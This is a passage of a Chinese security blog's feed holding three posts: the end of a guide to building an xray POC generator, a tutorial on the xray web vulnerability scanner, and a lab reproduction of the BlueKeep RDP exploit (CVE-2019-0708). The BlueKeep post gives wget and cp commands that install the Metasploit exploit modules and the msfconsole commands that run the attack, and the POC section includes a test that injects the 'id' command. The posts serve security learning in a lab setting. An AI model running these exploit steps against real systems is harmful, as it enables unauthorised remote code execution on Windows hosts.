class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd xray-poc-generation</span><br><span class="line"></span><br><span class="line">yarn</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180549.png" class="lozad"></p><p>原因：没有安装<code>yarn</code></p><p>使用<code>nmp install -g yarn</code>一键安装</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180601.png" class="lozad"></p><p>然后在使用<code>yarn</code>命令</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180614.png" class="lozad"></p><p>yarn build</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180627.png" class="lozad">    <img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180640.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180655.png" class="lozad"></p><h1 id="0x02-本地搭建"><a href="#0x02-本地搭建" class="headerlink" title="0x02 本地搭建"></a>0x02 本地搭建</h1><blockquote><p>环境需求：</p><p>Windows server 2003</p><p>PHPstudy</p></blockquote><p>将编译好的<code>build</code>文件夹中的内容直接复制到<code>www</code>根目录</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180722.png" class="lozad"></p><p>使用<code>ipconfig</code>命令查看<code>Windows server 2003 ip</code>地址</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180752.png" class="lozad"></p><p>然后使用 <code>http://ip地址</code> 直接访问</p><blockquote><p>注：如果直接将build文件夹复制到www目录下，需要修改index.html的文件，将相对路径改成含build的目录。</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180846.png" class="lozad"></p><h1 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h1><p>【测试数据】</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">poc-yaml-test</span><br><span class="line"></span><br><span class="line">post</span><br><span class="line"></span><br><span class="line">/poc?name=1</span><br><span class="line"></span><br><span class="line">command=&apos;id&apos;</span><br><span class="line"></span><br><span class="line">status == 200 &amp;&amp; body.bcontains(b&apos;test output&apos;)</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180916.png" class="lozad"></p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;今天在网上意外看到一个在线的&lt;code&gt;poc&lt;/code&gt;生成工具，&lt;a href=&quot;https:
      
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="POC" scheme="https://www.mad-coding.cn/tags/POC/"/>
    
  </entry>
  
  <entry>
    <title>XRay-一款好用的漏洞挖掘工具</title>
    <link href="https://www.mad-coding.cn/2019/09/17/XRay-%E4%B8%80%E6%AC%BE%E5%A5%BD%E7%94%A8%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B7%A5%E5%85%B7/"/>
    <id>https://www.mad-coding.cn/2019/09/17/XRay-一款好用的漏洞挖掘工具/</id>
    <published>2019-09-17T07:36:03.000Z</published>
    <updated>2019-09-20T07:34:58.165Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在漏洞挖掘中除了手动挖掘，一般都是用一些扫描器开辅助我们去进行测试，比如AWVS,APPSCAN，netsparker等等。今天给大家介绍一款被动扫描的扫描漏洞的神器——Xray，这款工具我自己用过了，的确挺好用，还能让burpsuite作为下游代理，不耽误测试。</p><p><img alt="img" data-src="https://i03piccdn.sogoucdn.com/c2c21aac4effe107" class="lozad"></p><h1 id="0x01-xray简介"><a href="#0x01-xray简介" class="headerlink" title="0x01 xray简介"></a>0x01 xray简介</h1><p>xray是从长亭洞鉴核心引擎中提取出的社区版漏洞扫描神器，支持主动、被动多种扫描方式，自备盲打平台、可以灵活定义 POC，功能丰富，调用简单，支持Windows /macOS / Linux 多种操作系统，可以满足广大安全从业者的自动化 Web 漏洞探测需求。</p><p>下载地址：<a href="https://github.com/chaitin/xray" target="_blank" rel="noopener">传送门</a></p><p>官网地址：<a href="https://chaitin.github.io/xray/#/" target="_blank" rel="noopener">传送门</a></p><p>github地址：<a href="https://github.com/chaitin/xray" target="_blank" rel="noopener">传送门</a></p><blockquote><p>可检测漏洞模块</p><ul><li><p>XSS漏洞检测 (key: xss)</p><p>利用语义分析的方式检测XSS漏洞</p></li><li><p>SQL 注入检测 (key: sqldet)</p><p>支持报错注入、布尔注入和时间盲注等</p></li><li><p>命令/代码注入检测 (key: cmd_injection)</p><p>支持 shell 命令注入、PHP 代码执行、模板注入等</p></li><li><p>目录枚举 (key: dirscan)</p><p>检测备份文件、临时文件、debug 页面、配置文件等10余类敏感路径和文件</p></li><li><p>路径穿越检测 (key: path_traversal)</p><p>支持常见平台和编码</p></li><li><p>XML 实体注入检测 (key: xxe)</p><p>支持有回显和反连平台检测</p></li><li><p>poc 管理 (key: phantasm)</p><p>默认内置部分常用的 poc，用户可以根据需要自行构建 poc 并运行。文档：<a href="https://chaitin.github.io/xray/#/guide/poc" target="_blank" rel="noopener">https://chaitin.github.io/xray/#/guide/poc</a></p></li><li><p>文件上传检测 (key: upload)</p><p>支持常见的后端语言</p></li><li><p>弱口令检测 (key: brute_force)</p><p>社区版支持检测 HTTP 基础认证和简易表单弱口令，内置常见用户名和密码字典</p></li><li><p>jsonp 检测 (key: jsonp)</p><p>检测包含敏感信息可以被跨域读取的 jsonp 接口</p></li><li><p>ssrf 检测 (key: ssrf)</p><p>ssrf 检测模块，支持常见的绕过技术和反连平台检测</p></li><li><p>基线检查 (key: baseline)</p><p>检测低 SSL 版本、缺失的或错误添加的 http 头等</p></li><li><p>任意跳转检测 (key: redirect)</p><p>支持 HTML meta 跳转、30x 跳转等</p></li><li><p>CRLF 注入 (key: crlf_injection)</p><p>检测 HTTP 头注入，支持 query、body 等位置的参数</p></li><li><p>..</p></li></ul></blockquote><h1 id="0x02-快速使用"><a href="#0x02-快速使用" class="headerlink" title="0x02 快速使用"></a>0x02 快速使用</h1><p>官网演示：</p><p><img alt="img" data-src="https://camo.githubusercontent.com/8b552644c67728075ef96a2cc56bf15730f21d28/68747470733a2f2f6368616974696e2e6769746875622e696f2f787261792f6173736574732f7465726d2e737667" class="lozad"></p><ol><li><p>使用基础爬虫爬取并对爬虫爬取的链接进行漏洞扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --basic-crawler http://example.com --html-output vuln.html</span><br></pre></td></tr></table></figure><p>不指定输出时，默认输出到控制台的标准输出中,不同参数对应不同的输出方式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#无参数：输出到控制台的标准输出</span></span><br><span class="line">--`text-output`：输出到文本文件中</span><br><span class="line">--`json-output`：输出到 JSON 文件中</span><br><span class="line">--`html-output`：输出到 HTML 文件中</span><br></pre></td></tr></table></figure><p>使用HTTP代理进行被动扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure><p>设置浏览器http代理为<code>http://127.0.0.1:7777</code>，就可以自动分析代理流量并扫描。</p><blockquote><p>如需扫描https流量，请阅读下方文档<code>抓取 https 流量</code>部分</p></blockquote></li><li><p>只扫描单个url，不使用爬虫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --url http://example.com/ ？a = b --html-output single-url.html</span><br></pre></td></tr></table></figure></li><li><p>手动指定本次运行的插件</p><p>默认情况下，将会启用所有内置插件，可以使用下列命令指定本次扫描启用的插件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --plugins cmd_injection，sqldet --url http://example.com</span><br><span class="line">xray webscan --plugins cmd_injection，sqldet --listen 127.0.0.1:7777</span><br></pre></td></tr></table></figure></li><li><p>指定插件输出</p><p>可以指定将本次扫描的漏洞信息输出到某个文件中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --url http://example.com/ ？a = b</span><br><span class="line">--text-output result.txt --json-output result.json --html-output report.html</span><br></pre></td></tr></table></figure><p><a href="https://chaitin.github.io/xray/assets/report_example.html" target="_blank" rel="noopener">报告样例</a></p></li><li><p>运行只单个<strong>内置</strong> POC</p><p>在xray中，所有的pocdency属于插件<code>phantasm</code>，所以使用poc时需要开启<code>phantasm</code>插件才可生效。<code>--poc</code>参数指定本次运行的poc，如不指定，将运行所有的内置poc。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --plugins phantasm --poc poc-yaml-thinkphp5-controller-rce --url http://example.com/</span><br></pre></td></tr></table></figure></li><li><p>运行用户自定义POC</p><p>用户可以按需书写自己的YAML格式的POC，并通过指定<code>--poc</code>参数运行，比如运行在<code>/home/test/1.yaml</code>处的POC。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --plugins phantasm --poc /home/test/1.yaml --url http://example.com/</span><br></pre></td></tr></table></figure><p><code>--poc</code> 参数非常灵活，支持Glob匹配，支持从目录加载，可以从以下几个例子理解用法：</p><p>加载<code>/home/test/pocs/</code>所有的POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --plugins phantasm --poc “ / home / test / pocs / * ”</span><br></pre></td></tr></table></figure><p>加载<code>/home/test/pocs/</code>下包含thinkphp的POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --plugins phantasm --poc “ / home / test / pocs / * thinkphp * ”</span><br></pre></td></tr></table></figure><p>自定义POC请查看文档。</p></li><li><p>转发漏洞信息到数据库，邮件，IM通知等</p><p>用户可以使用<code>--webhook-output</code>将漏洞信息进行转发，后端需要返回状态200才认为发送成功，否则将打印错误日志。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --url http://example.com/ --webhook-output http：// host：port / path</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>ps:如何是Windows的，需要使用xray***.exe文件</p></blockquote><h1 id="0x03-抓取https流量"><a href="#0x03-抓取https流量" class="headerlink" title="0x03  抓取https流量"></a>0x03  抓取https流量</h1><h2 id="3-1-生成证书"><a href="#3-1-生成证书" class="headerlink" title="3.1 生成证书"></a>3.1 生成证书</h2><p>和burp类似，抓取https流量需要信任一个根证书，这个根证书可以自行生成，也可用下列自带的命令生成：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xray genca  <span class="comment">## Linux</span></span><br><span class="line"></span><br><span class="line">xray_windows_amd64.exe genca <span class="comment">##Windows</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920142437.png" class="lozad"></p><p>然后xray文件夹下会产生ca证书和ca.key两个文件</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920142543.png" class="lozad"></p><blockquote><p>Firefox浏览器没有使用系统的根证书管理器，意味着使用Firefox时需要单独在该浏览内导入证书才可生效。对于移动端等，可以在挂代理之后访问<code>http://xray/</code>然后下载根证书。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143319.png" class="lozad"></p></blockquote><p>未安装证书前，提示证书风险，访问https的网站会提示证书风险</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920112843.png" class="lozad"></p><h2 id="3-2-安装证书"><a href="#3-2-安装证书" class="headerlink" title="3.2 安装证书"></a>3.2 安装证书</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143343.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143434.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143442.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143458.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143509.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143531.png" class="lozad"></p><h2 id="3-3-测试"><a href="#3-3-测试" class="headerlink" title="3.3 测试"></a>3.3 测试</h2><p>安装好证书后，重启浏览器，再次访问百度，可以看到没有证书不安全的标志了，说明证书安装成功</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143558.png" class="lozad"></p><p>碰巧还看到了检测出一个漏洞</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143609.png" class="lozad"></p><h1 id="0x04-使用技巧"><a href="#0x04-使用技巧" class="headerlink" title="0x04 使用技巧"></a>0x04 使用技巧</h1><h2 id="4-1-常用命令"><a href="#4-1-常用命令" class="headerlink" title="4.1 常用命令"></a>4.1 常用命令</h2><p>虽然在刚刚前面的快速使用中命令有很多种，但是常用的命令就那几个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure><p>浏览器设置本地代理，以360浏览器为例</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920150553.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920150614.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920150644.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920150734.png" class="lozad"></p><p>然后通过浏览器手动点击一些页面，xray会自动对这些页面进行测试，非常好用</p><h2 id="4-2-结合burpsuite使用"><a href="#4-2-结合burpsuite使用" class="headerlink" title="4.2 结合burpsuite使用"></a>4.2 结合burpsuite使用</h2><p>burpsuite是个神器是大家公认的，对有很多网站不能使用像AWVS和APPscan这样的大型扫描器来进行测试的，所以只能使用burpsuite来进行手动测试了。在这里如果将burpsuite和xray结合在一起的话，那找漏洞是非常nice的。</p><p><img alt="img" data-src="https://chaitin.github.io/xray/assets/xray-burp-proxy-chain.png" class="lozad"></p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p>1、<a href="https://www.anquanke.com/post/id/184204" target="_blank" rel="noopener">https://www.anquanke.com/post/id/184204</a></p><p>2、<a href="https://www.jishuwen.com/d/2TvQ" target="_blank" rel="noopener">https://www.jishuwen.com/d/2TvQ</a></p><p>3、 <a href="https://chaitin.github.io/xray" target="_blank" rel="noopener">https://chaitin.github.io/xray</a></p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在漏洞挖掘中除了手动挖掘，一般都是用一些扫描器开辅助我们去进行测试，比如AWVS,APPSCAN，n
      
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="xray" scheme="https://www.mad-coding.cn/tags/xray/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708复现教程</title>
    <link href="https://www.mad-coding.cn/2019/09/11/CVE-2019-0708%E5%A4%8D%E7%8E%B0%E6%95%99%E7%A8%8B/"/>
    <id>https://www.mad-coding.cn/2019/09/11/CVE-2019-0708复现教程/</id>
    <published>2019-09-11T09:23:28.000Z</published>
    <updated>2019-09-11T10:29:44.651Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前几天，随着CVE-2019-0708漏洞EXP的现世，顿时让安全圈躁动起来，大家都通过官网的一些文档教程来自己搭建环境复现漏洞，而菜鸡的我，复现了好久，却久久不能复现成功，今天再次复现，发现了问题的所在，再次献上自己的复现教程，虽然网上教程已经泛滥。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911173741.png" class="lozad"></p><a id="more"></a><h1 id="0x01-测试环境"><a href="#0x01-测试环境" class="headerlink" title="0x01 测试环境"></a>0x01 测试环境</h1><blockquote><p>攻击机：kali Linux 2019.2</p><p>靶机：Windows7 ultimate SP1 </p><p>Windows server 2008 R2标准版</p><p>攻击框架：metasploit</p><p>EXP：cve_2019_0708_bluekeep_rce</p></blockquote><h1 id="0x02-相关文件下载"><a href="#0x02-相关文件下载" class="headerlink" title="0x02 相关文件下载"></a>0x02 相关文件下载</h1><p>CVE-2019-0708 exp下载地址：<a href="https://github.com/mai-lang-chai/CVE-2019-0708-RCE/blob/master/CVE-2019-0708RDPMSF%E6%94%BB%E5%87%BB%E5%A5%97%E4%BB%B6.zip" target="_blank" rel="noopener">传送门</a></p><p>Windows7 ultimate SP1下载地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/</span><br></pre></td></tr></table></figure><p>Windows server 2008 R2标准版下载地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ed2k://|file|cn_windows_server_2008_r2_hpc_edition_with_service_pack_1_x64_dvd_700632.iso|3071051776|7FDEE0F7A49FC63148D4DE580D803742|/</span><br></pre></td></tr></table></figure><h1 id="0x03-开搞"><a href="#0x03-开搞" class="headerlink" title="0x03 开搞"></a>0x03 开搞</h1><h2 id="3-1-跟新metasploit框架"><a href="#3-1-跟新metasploit框架" class="headerlink" title="3.1 跟新metasploit框架"></a>3.1 跟新metasploit框架</h2><p>首先需要跟新到最新的metasploit框架，版本是5.0.47版本</p><p>跟新命令脚本如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br></pre></td></tr></table></figure><p>跟新完成的版本截图</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174035.png" class="lozad"></p><p>跟新后可能会出现如下两个问题</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174058.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174146.png" class="lozad"></p><p>意思是没有启动带数据库支持的MSF服务需要我们去启动，其实这对于复现漏洞没有影响，就是看着难受</p><p>【解决方法】</p><p>我们使用<code>exit</code>退出<code>msfconsole</code>,然后输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br></pre></td></tr></table></figure><p>输入完成后等待显示：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174310.png" class="lozad"></p><p>这个字样在输入：msfdb init</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174325.png" class="lozad"></p><p>再次输入msfconsole，问题解决</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174344.png" class="lozad"></p><h2 id="3-2-替换exp文件"><a href="#3-2-替换exp文件" class="headerlink" title="3.2 替换exp文件"></a>3.2 替换exp文件</h2><p>首先需要下载0708的exp文件，这个文件在前面以及分享过了，也可以利用wget命令直接下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></table></figure><p> 然后，进入刚刚下载的exp的目录，然后使用下面命令替换原来的exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cp rdp.rb /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb</span><br><span class="line"></span><br><span class="line">cp rdp_scanner.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line"></span><br><span class="line">cp cve_2019_0708_bluekeep.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line"></span><br><span class="line">mkdir /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp  <span class="comment">##创建rdp目录</span></span><br><span class="line"></span><br><span class="line">cp cve_2019_0708_bluekeep_rce.rb /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure><h2 id="3-3-开始复现"><a href="#3-3-开始复现" class="headerlink" title="3.3 开始复现"></a>3.3 开始复现</h2><h3 id="3-3-1-Windows-7-x64-sp1配置"><a href="#3-3-1-Windows-7-x64-sp1配置" class="headerlink" title="3.3.1 Windows 7 x64 sp1配置"></a>3.3.1 Windows 7 x64 sp1配置</h3><p>第一步：关闭防火墙</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175227.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175304.png" class="lozad"></p><p><img alt="1568195617145" data-src="C:%5CUsers%5C10367%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1568195617145.png" class="lozad"></p><p>第二步：开启3389远程</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175410.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175444.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175542.png" class="lozad"></p><h3 id="3-3-2使用的命令"><a href="#3-3-2使用的命令" class="headerlink" title="3.3.2使用的命令"></a>3.3.2使用的命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole <span class="comment">##进入metasploit框架</span></span><br><span class="line">reload_all <span class="comment">##重新载入漏洞模块</span></span><br><span class="line">search 0708 <span class="comment">##搜索0708的漏洞</span></span><br><span class="line">use exploit/windows/rdp/cve_2019_0708_bluekeep _rce  <span class="comment">##0708RDP攻击模块</span></span><br><span class="line">info  <span class="comment">##查看漏洞的相关信息</span></span><br><span class="line">show options <span class="comment">##查看需要设置的参数</span></span><br><span class="line"><span class="built_in">set</span> rhosts <span class="comment">##靶机ip ##设置需要攻击的靶机ip地址</span></span><br><span class="line">show targets  <span class="comment">##显示可以攻击的靶机类型</span></span><br><span class="line"><span class="built_in">set</span> target 数字 <span class="comment">##设置攻击的靶机类型</span></span><br><span class="line">exploit <span class="comment">##开始利用</span></span><br></pre></td></tr></table></figure><blockquote><p>msfconsole</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180426.png" class="lozad"></p><blockquote><p>reload_all</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180514.png" class="lozad"></p><blockquote><p>search 0708</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180532.png" class="lozad"></p><blockquote><p>info</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Name: CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free</span><br><span class="line">Module: exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">Platform: Windows</span><br><span class="line">Arch: </span><br><span class="line">       Privileged: Yes</span><br><span class="line">License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Manual</span><br><span class="line">  Disclosed: 2019-05-14</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Sean Dillon &lt;sean.dillon@risksense.com&gt;</span><br><span class="line">  Ryan Hanson &lt;dunno@findthisout.com&gt;</span><br><span class="line">  OJ Reeves &lt;oj@beyondbinary.io&gt;</span><br><span class="line">  Brent Cook &lt;bcook@rapid7.com&gt;</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Automatic targeting via fingerprinting</span><br><span class="line">  1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)</span><br><span class="line">  2   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox)</span><br><span class="line">  3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare)</span><br><span class="line">  4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  Yes</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name             Current Setting  Required  Description</span><br><span class="line">  ----             ---------------  --------  -----------</span><br><span class="line">  RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect</span><br><span class="line">  RDP_CLIENT_NAME  ethdev           no        The client computer name to report during connect, UNSET = random</span><br><span class="line">  RDP_DOMAIN                        no        The client domain name to report during connect</span><br><span class="line">  RDP_USER                          no        The username to report during connect, UNSET = random</span><br><span class="line">  RHOSTS                            yes       The target address range or CIDR identifier</span><br><span class="line">  RPORT            3389             yes       The target port (TCP)</span><br><span 